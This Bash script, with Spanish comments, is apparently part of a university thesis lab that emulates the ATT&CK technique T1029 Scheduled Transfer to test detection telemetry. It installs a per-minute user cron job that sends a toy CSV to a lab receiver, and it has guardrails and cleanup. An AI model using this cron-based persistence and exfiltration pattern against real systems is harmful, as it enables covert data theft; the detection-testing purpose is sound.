#!/usr/bin/env bash
# ============================================================================
# ATA021 · T1029 Scheduled Transfer — ataque MANUAL (escrito por el TFG)
# ----------------------------------------------------------------------------
# Tecnica : T1029 Scheduled Transfer (tactica Exfiltration)
# Fuente  : custom (escrito por el TFG)
# Objetivo: PROGRAMAR la transferencia (crontab del usuario angel, SIN sudo) y
#           dejar que el PLANIFICADOR la ejecute DENTRO de la ventana. Crea un
#           artefacto de PERSISTENCIA (entrada de cron) y un envio real al receptor.
# Destino : tarea de cron (usuario angel) + http://192.168.65.1:9090/api/scheduled/…
# Ejecuta : desde /home/angel/lab-attack/ATA021 (cwd del ataque -> ancla H4)
# Elevacion: NO (usuario angel). No se instala nada. NO se toca el cron de root/sistema.
#
# ⚠️ REQUISITO: el receptor (Soporte/Ataques/receiver/sink_http.py) debe estar
#    LEVANTADO en el HOST antes de t0 (ver README §9). La prueba de que el dato
#    SALIO es la linea del `sink.log` con el sha256 coincidente.
#
# GUARDARRAILES (abortan si no se cumplen):
#   - ABORTA si ya existe un crontab de `angel` (no se pisa nada);
#   - solo se USA el crontab del usuario actual (jamas root ni /etc/cron.*);
#   - el endpoint DEBE ser el receptor del laboratorio;
#   - al terminar se RETIRA la entrada (limpieza) — la persistencia no se deja viva.
#
# Telemetria esperada (ver README §5):
#   - execve de crontab (instalar/retirar el job) -> 80792 (deteccion; T1029-S1).
#   - execve de curl (job lanzado por cron; cwd anclado) -> 80792 (deteccion; T1029-S2).
#   - el lanzador `/bin/sh` (dash) de cron (cwd=$HOME) -> declarado AMBIGUA -> dudosa -> `artefacto`.
#
# Prueba de exito (INDEPENDIENTE de la alerta): `sink.log` del HOST con
#   POST /api/scheduled/dato_programado.csv + sha256 coincidente, mas `fired.ok`.
# Salida: marcadores T0 / T1_LOCAL en stdout (UTC).
# ============================================================================
set -u

BASE="${HOME}/lab-attack/ATA021"
DATA="${BASE}/dato_programado.csv"
JOB="${BASE}/cron_job.sh"
HOST="192.168.65.1"
PORT="9090"
ENDPOINT_BASE="http://${HOST}:${PORT}/api/scheduled"
LINES="* * * * * cd /home/angel/lab-attack/ATA021 && /bin/bash ./cron_job.sh >/dev/null 2>&1"

echo "ATA021 · T1029 Scheduled Transfer (crontab de usuario + disparo por cron) — custom (manual)"
echo "T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)"

# --- precondiciones (fallan ruidosamente, sin tocar nada) ---
if [ ! -d "$BASE" ] || [ ! -f "$JOB" ]; then
  echo "ERROR: falta $BASE o el job (¿scp del directorio de la tecnica?)" >&2
  exit 1
fi
for t in crontab curl sha256sum; do
  if ! command -v "$t" >/dev/null 2>&1; then
    echo "ERROR: $t no disponible" >&2
    exit 1
  fi
done

# cwd determinista = carpeta del ataque (ancla H4 del execve)
cd "$BASE" || { echo "ERROR: no puedo cd a $BASE" >&2; exit 1; }

# GUARDARRAIL: el endpoint DEBE ser el receptor del laboratorio (VMnet1 del host).
case "$ENDPOINT_BASE" in
  "http://192.168.65.1:9090/"*) : ;;
  *) echo "ERROR: endpoint '$ENDPOINT_BASE' fuera del receptor del laboratorio (abortado)" >&2; exit 1 ;;
esac

# GUARDARRAIL: NO pisar un crontab existente (el de angel esta vacio en lab-listo).
if crontab -l 2>/dev/null | grep -q .; then
  echo "ERROR: ya existe un crontab de angel; abortado para no pisarlo" >&2
  exit 1
fi

rm -f "${BASE}/fired.ok"

# 0) SIEMBRA del dato a exfiltrar (datos de juguete; builtin printf, sin execve).
if [ ! -f "$DATA" ]; then
  {
    printf 'periodo,concepto,importe_eur\n'
    printf '2026-09,Planificacion trimestral,54000.00\n'
    printf '2026-09,Informe comite direccion,12800.00\n'
  } > "$DATA"
fi
echo "--- DATO PROGRAMADO (sha256) ---"
sha256sum "$DATA"

# 1) PROGRAMAR la transferencia (execve de crontab): una entrada de usuario cada minuto.
echo ">>> instalando entrada de cron (usuario angel)"
printf '%s\n' "$LINES" | crontab -
crontab -l

# 2) Esperar a que cron EJECUTE el job DENTRO de la ventana (hasta 100 s).
echo ">>> esperando el disparo de cron (hasta 100 s)"
for i in $(seq 1 100); do
  [ -f "${BASE}/fired.ok" ] && break
  sleep 1
done

# 3) RETIRAR la persistencia (limpieza; execve de crontab). El job ya se ejecuto.
echo ">>> retirando la entrada de cron"
crontab -r 2>/dev/null || true
crontab -l 2>/dev/null || echo "(crontab de angel vacio)"

# 4) PRUEBA DE EFECTO local: el job dejo su marca con la hora del disparo.
echo "--- estado final ---"
ls -l "$DATA"
if [ -f "${BASE}/fired.ok" ]; then
  echo "disparo_cron=$(cat "${BASE}/fired.ok")"
  echo "TRANSFERENCIA_PROGRAMADA=OK (cron ejecuto el job dentro de la ventana)"
else
  echo "TRANSFERENCIA_PROGRAMADA=FALLO (cron no disparo dentro de la ventana)" >&2
fi
sleep 1
echo "T1_LOCAL=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
